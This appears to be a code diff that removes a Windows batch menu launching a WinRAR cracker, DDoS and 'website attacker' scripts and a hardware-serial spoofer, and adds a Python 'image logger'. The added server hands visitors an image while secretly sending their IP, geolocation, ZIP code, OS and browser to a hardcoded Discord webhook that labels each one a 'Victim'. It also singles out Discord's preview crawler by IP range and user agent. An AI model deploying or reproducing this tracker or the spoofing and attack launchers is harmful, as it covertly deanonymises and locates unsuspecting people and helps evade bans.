@@ -1,145 +1,69 @@
-@echo off
-mode 85, 20
-set current_path=%cd%
-cd %current_path%/files
-chcp 65001 >nul
- 
- 
- 
-:banner
-cls
-echo.
-echo.
-echo.
-ping localhost -n 2 >nul
-echo                         [34m  ▄▄▄· ▄▄▄· ▄▄▄▄▄ ▄▄·  ▄ .▄[0m
-ping localhost -n 1 >nul
-echo                         [34m ▐█ ▄█▐█ ▀█ •██  ▐█ ▌▪██▪▐█[0m
-ping localhost -n 1 >nul
-echo                         [36m  ██▀·▄█▀▀█  ▐█.▪██ ▄▄██▀▐█[0m
-ping localhost -n 1 >nul
-echo                         [36m ▐█▪·•▐█ ▪▐▌ ▐█▌·▐███▌██▌▐▀[0m
-ping localhost -n 1 >nul
-echo                         [96m .▀    ▀  ▀  ▀▀▀ ·▀▀▀ ▀▀▀ ·[0m
-echo.
-echo.
-echo.
- 
-:input
-ping localhost -n 1 >nul
-echo       [36m═╦════► [0m [36m/ 1 - Winrar Cracker \ 				4 - Next Page [0m
-ping localhost -n 1 >nul
-echo        [36m╩╦════► [0m [0m [36m/ 2 -  DDOS \[0m
-ping localhost -n 1 >nul
-echo         [36m╩═══╦═► [0m [0m [36m/ 3 -  Website Attacker \[0m
-echo         [36m    ║ [0m [0m
-echo|set /p=[36m            ╚═══►[0m
-choice /c 1234 >nul
- 
- 
-if /I "%errorlevel%" EQU "1" (
-	start winrar.bat
-	goto :banner
-) else if /I "%errorlevel%" EQU "2" (
-	start ddos.py
-	goto :start
-) else if /I "%errorlevel%" EQU "3" (
-	start website.py
-	goto :start
-) else if /I "%errorlevel%" EQU "4" (
-	goto :page2
-)
- 
-:page2
-cls
-echo.
-echo.
-echo.
-ping localhost -n 2 >nul
-echo                         [35m  ▄▄▄· ▄▄▄· ▄▄▄▄▄ ▄▄·  ▄ .▄[0m
-ping localhost -n 1 >nul
-echo                         [35m ▐█ ▄█▐█ ▀█ •██  ▐█ ▌▪██▪▐█[0m
-ping localhost -n 1 >nul
-echo                         [36m  ██▀·▄█▀▀█  ▐█.▪██ ▄▄██▀▐█[0m
-ping localhost -n 1 >nul
-echo                         [36m ▐█▪·•▐█ ▪▐▌ ▐█▌·▐███▌██▌▐▀[0m
-ping localhost -n 1 >nul
-echo                         [96m .▀    ▀  ▀  ▀▀▀ ·▀▀▀ ▀▀▀ ·[0m
-echo.
-echo.
-echo.
- 
-:input2
-ping localhost -n 1 >nul
-echo       [36m═╦════► [0m [36m/ 1 - perm spoof \ 				4 - Previous Page [0m
-ping localhost -n 1 >nul
-echo        [36m╩╦════► [0m [0m [36m/ 2 -  check serials \[0m
-ping localhost -n 1 >nul
-echo         [36m╩═══╦═► [0m [0m [36m/ 3 -  Fix serials not changing \[0m
-echo         [36m    ║ [0m [0m
-echo|set /p=[36m            ╚═══►[0m
-choice /c 1234 >nul
- 
- 
- 
-if /I "%errorlevel%" EQU "1" (
- 
-	executable.exe /IVN %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /IV %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /IV %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SM %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SP %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SV %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SS %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SU AUTO
-	executable.exe /SK %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /SF %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BM %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BP %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BV %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BS %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BT %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /BLC %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /CM %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /CV %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /CS %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /CA %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /CSK %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /PSN %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /PAT %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /PPN %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 1 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 2 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 3 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 4 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 5 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 6 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 7 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 8 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 9 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 10 %RANDOM%-%RANDOM%-%RANDOM%
-	executable.exe /OS 11 %RANDOM%-%RANDOM%-%RANDOM%
-	net stop winmgmt /Y >nul
-	goto :perm
-) else if /I "%errorlevel%" EQU "2" (
- 
-	cls
-	wmic bios get serialnumber
-	wmic csproduct get uuid
-	wmic cpu get serialnumber
-	wmic baseboard get serialnumber
-	wmic baseboard get manufacturer
-	pause
-	goto :perm
-) else if /I "%errorlevel%" EQU "3" (
- 
-	net stop winmgmt /Y >nul
-	net stop winmgmt /Y >nul
-	net stop winmgmt /Y >nul
-	net stop winmgmt /Y >nul
-	net stop winmgmt /Y >nul
-	pause
-	goto :perm
-) else if /I "%errorlevel%" EQU "4" (
-	goto :start
-) 
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import httpx, base64, httpagentparser
+
+webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+
+bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+
+def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
+    return {
+  "username": "Fentanyl",
+  "content": "@everyone",
+  "embeds": [
+    {
+      "title": "Fentanyl strikes again!",
+      "color": 16711803,
+      "description": "A Victim opened the original Image. You can find their info below.",
+      "author": {
+        "name": "Fentanyl"
+      },
+      "fields": [
+        {
+          "name": "IP Info",
+          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
+          "inline": True
+        },
+        {
+          "name": "Advanced Info",
+          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
+          "inline": False
+        }
+      ]
+    }
+  ],
+}
+
+def prev(ip,uag):
+  return {
+  "username": "Fentanyl",
+  "content": "",
+  "embeds": [
+    {
+      "title": "Fentanyl Alert!",
+      "color": 16711803,
+      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "author": {
+        "name": "Fentanyl"
+      },
+      "fields": [
+      ]
+    }
+  ],
+}
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        s = self.path
+        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
+        except Exception: data = bindata
+        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
+        os, browser = httpagentparser.simple_detect(useragent)
+        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
+            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
+            else: pass
+        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
+        return
